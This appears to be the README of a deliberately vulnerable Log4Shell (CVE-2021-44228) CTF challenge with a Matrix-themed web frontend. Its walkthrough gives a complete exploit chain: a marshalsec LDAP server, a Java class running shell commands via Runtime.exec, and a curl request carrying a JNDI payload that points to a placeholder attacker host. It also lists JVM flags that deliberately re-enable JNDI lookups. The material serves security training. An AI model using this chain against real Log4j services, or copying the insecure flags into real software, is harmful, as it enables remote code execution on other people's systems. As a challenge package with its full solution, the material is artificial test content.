# 🎯 Escape The Matrix - Log4Shell CTF Challenge

<div align="center">

![Matrix Theme](https://img.shields.io/badge/Theme-Matrix-00ff00?style=for-the-badge)
![Difficulty](https://img.shields.io/badge/Difficulty-Medium-orange?style=for-the-badge)
![Category](https://img.shields.io/badge/Category-Web%20Exploitation-blue?style=for-the-badge)
![CVE](https://img.shields.io/badge/CVE-2021--44228-red?style=for-the-badge)

**A CTF challenge featuring Log4j JNDI injection with a Matrix-themed frontend**

</div>

---

## 📖 Challenge Description

> *"You find yourself trapped inside the Matrix. To escape, you must solve the puzzle hidden within the cascading code. Click through the sequence of encrypted GIFs to collect fragments that will reveal the path to freedom. But beware—the true exit lies deeper in the void..."*

**Escape The Matrix** is a web exploitation challenge that combines:
- 🎨 **Immersive Matrix-themed UI** with WebGL rendering
- 🔍 **Sequential puzzle mechanics** through GIF fragment collection
- 💣 **Log4Shell (CVE-2021-44228)** vulnerability for RCE
- 🎭 **Hidden attack vector** discoverable through DOM inspection

### Challenge Objectives:
1. Interact with the Matrix UI and collect all 13 GIF fragments
2. Extract and decode base64 fragments from response headers
3. Discover the hidden vulnerable endpoint
4. Exploit Log4j JNDI injection to achieve RCE
5. Retrieve the flag from the server

---

## 🚀 Quick Start

### 🐳 Docker Deployment (Recommended)

```bash
# Build the Docker image
docker build -t escape-matrix .

# Run the container
docker run -d -p 8080:8080 --name escape-matrix-ctf escape-matrix

# Access the challenge
# Open http://localhost:8080 in your browser
```

### 🛠️ Manual Setup

#### Prerequisites
- **Java 8** (JDK 1.8)
- **Maven 3.8+**
- **Node.js 20+**
- **Docker** (optional)

#### Backend Setup
```bash
cd server
mvn clean package
java -jar target/ctf-0.0.1-SNAPSHOT.jar
```

#### Frontend Setup (Development)
```bash
cd frontend
npm install
npm run dev
# Access at http://localhost:5173
```

---

## 🎮 Challenge Walkthrough

### Stage 1: Escape the Matrix 🟢

1. **Access the Application**
   - Navigate to `http://localhost:8080`
   - Observe the Matrix-themed UI with falling code

2. **Collect GIF Fragments**
   - Click the green "Escape Matrix" button
   - Each click fetches a GIF and appends a fragment to the DOM
   - **Key Discovery**: Open browser DevTools → Network tab
   - Inspect response headers for each request

3. **Find the X-Matrix-Id Header**
   ```
   X-Matrix-Id: UE9TVCAvYXB...
   ```
   - This header contains a base64 fragment
   - Collect all 13 fragments in order

4. **DOM Mutation Analysis**
   - Inspect the `#matrix-card` element after each click
   - Notice the ID attribute changes: `matrix-card.fragment1.fragment2...`
   - Fragments are URL-safe base64 (- instead of +, _ instead of /)

### Stage 2: Decode the Path 🔵

1. **Extract All Fragments**
   - Collect all 13 base64 fragments from `X-Matrix-Id` headers
   - Concatenate them in order:
   ```
   UE9TVCAvYXBpL200dHIxeF9Fc2M0cDNkL2VuVDNyX3RoM192MGlEIENvbnRlbnQtVHlwZTogYXBwbGljYXRpb24vanNvbiB7InRyNGMzIjoiLi4iLCJ2MGlkIjoiLi4iLCIzbnRyMHB5IjoiLi4iLCJuMGRFIjoiLi4ifQ==
   ```

2. **Base64 Decode**
   ```bash
   echo "UE9TVCAvYXBpL200dHIxeF9Fc2M0cDNkL2VuVDNyX3RoM192MGlEIENvbnRlbnQtVHlwZTogYXBwbGljYXRpb24vanNvbiB7InRyNGMzIjoiLi4iLCJ2MGlkIjoiLi4iLCIzbnRyMHB5IjoiLi4iLCJuMGRFIjoiLi4ifQ==" | base64 -d
   ```

3. **Revealed Attack Vector**
   ```
   POST /api/m4tr1x_Esc4p3d/enT3r_th3_v0iD 
   Content-Type: application/json 
   {"tr4c3":"..","v0id":"..","3ntr0py":"..","n0dE":".."}
   ```

### Stage 3: Enter the Void 🔴

1. **Test the Hidden Endpoint**
   ```bash
   curl -X POST 'http://localhost:8080/api/m4tr1x_Esc4p3d/enT3r_th3_v0iD' \
     -H 'Content-Type: application/json' \
     -d '{"tr4c3":"test","v0id":"test","3ntr0py":"test","n0dE":"test"}'
   ```

2. **Identify the Vulnerable Parameter**
   - The `v0id` parameter is logged via Log4j
   - Server uses Log4j 2.14.1 (vulnerable to CVE-2021-44228)

3. **Exploit Log4Shell**

   **Setup LDAP Server:**
   ```bash
   # Download marshalsec
   git clone https://github.com/mbechler/marshalsec
   cd marshalsec
   mvn clean package -DskipTests
   
   # Start LDAP server
   java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar \
     marshalsec.jndi.LDAPRefServer \
     "http://YOUR_IP:8000/#Exploit"
   ```

   **Create Exploit Class:**
   ```java
   // Exploit.java
   public class Exploit {
       static {
           try {
               Runtime.getRuntime().exec(new String[]{
                   "/bin/sh", "-c",
                   "cat /app/flag.txt > /tmp/flag && chmod 644 /tmp/flag"
               });
           } catch (Exception e) {
               e.printStackTrace();
           }
       }
   }
   ```

   **Compile and Serve:**
   ```bash
   javac Exploit.java
   python3 -m http.server 8000
   ```

   **Trigger Exploit:**
   ```bash
   curl -X POST 'http://localhost:8080/api/m4tr1x_Esc4p3d/enT3r_th3_v0iD' \
     -H 'Content-Type: application/json' \
     -d '{"tr4c3":"test","v0id":"${jndi:ldap://YOUR_IP:1389/Exploit}","3ntr0py":"test","n0dE":"test"}'
   ```

4. **Retrieve the Flag**
   ```bash
   # Flag should be written to /tmp/flag or output via your exploit
   ```

---

## 🏗️ Project Structure

```
Escape-The-Matrix/
├── Dockerfile                    # Multi-stage Docker build
├── flag.txt                      # Flag file (RCE target)
├── README.md                     # This file
│
├── frontend/                     # React + Vite frontend
│   ├── src/
│   │   ├── App.jsx              # Matrix WebGL room
│   │   ├── App.css              # Styling
│   │   ├── main.jsx             # Entry point
│   │   └── components/
│   │       └── MatrixCard.jsx   # Sequential GIF UI
│   ├── package.json
│   └── vite.config.js
│
└── server/                       # Spring Boot backend
    ├── pom.xml                   # Maven config (Log4j 2.14.1)
    ├── assets/                   # 13 GIF files
    ├── src/main/java/com/example/ctf/
    │   ├── EscapeTheMatrix.java  # Main application
    │   ├── Controllers/
    │   │   └── MatrixController.java  # Vulnerable endpoint
    │   └── Config/
    │       ├── CorsConfig.java
    │       └── StaticConfig.java # Blocks direct GIF access
    └── src/main/resources/
        ├── application.properties
        └── log4j2.xml            # Log4j configuration
```

---

## 🔐 Security Details

### Vulnerability Information
- **CVE**: CVE-2021-44228 (Log4Shell)
- **Component**: Apache Log4j 2.14.1
- **Attack Vector**: JNDI Injection via `v0id` parameter
- **Impact**: Remote Code Execution (RCE)

### Vulnerable Code
```java
// MatrixController.java (line 119)
logger.error("Matrix void signal: {}", payload.getV0id());
```

### JVM Flags (Intentionally Insecure)
```
-Dlog4j2.formatMsgNoLookups=false
-Dlog4j2.enableJndi=true
-Dcom.sun.jndi.ldap.object.trustURLCodebase=true
-Dcom.sun.jndi.rmi.object.trustURLCodebase=true
```

---

## 🎯 Learning Objectives

- ✅ Web application reconnaissance and endpoint discovery
- ✅ HTTP header analysis and base64 encoding
- ✅ DOM manipulation inspection
- ✅ Log4j JNDI injection exploitation
- ✅ LDAP server setup for exploit delivery
- ✅ Java RCE payload development
- ✅ CTF-style sequential puzzle solving

---

## 🔧 Configuration

### Environment Variables
```bash
# Backend port (default: 8080)
SERVER_PORT=8080

# Log level
LOGGING_LEVEL=WARN
```

### Flag Configuration
Edit `flag.txt` to set your custom flag:
```
NSC{your_custom_flag_here}
```

---

## 📚 Additional Resources

- [Log4Shell Explained](https://www.lunasec.io/docs/blog/log4j-zero-day/)
- [JNDI Injection](https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE.pdf)
- [Marshalsec Tool](https://github.com/mbechler/marshalsec)
- [CVE-2021-44228 Details](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---

## ⚠️ Disclaimer

**This application is INTENTIONALLY VULNERABLE for educational purposes only.**

- 🚫 **DO NOT** deploy in production environments
- 🚫 **DO NOT** use on systems you don't own
- ✅ **ONLY** use in isolated CTF/lab environments
- ✅ **ALWAYS** run in Docker containers or VMs

---

## 👥 Credits

- **Challenge Design**: [Your Name/Team]
- **Matrix UI**: WebGL shader implementation
- **Vulnerability**: CVE-2021-44228 (Log4Shell)

---

## 📝 License

This project is for educational purposes only. Use responsibly.

---

<div align="center">

**Ready to escape the Matrix? 🟢💊**

*"There is no spoon... only JNDI lookups."*

</div>

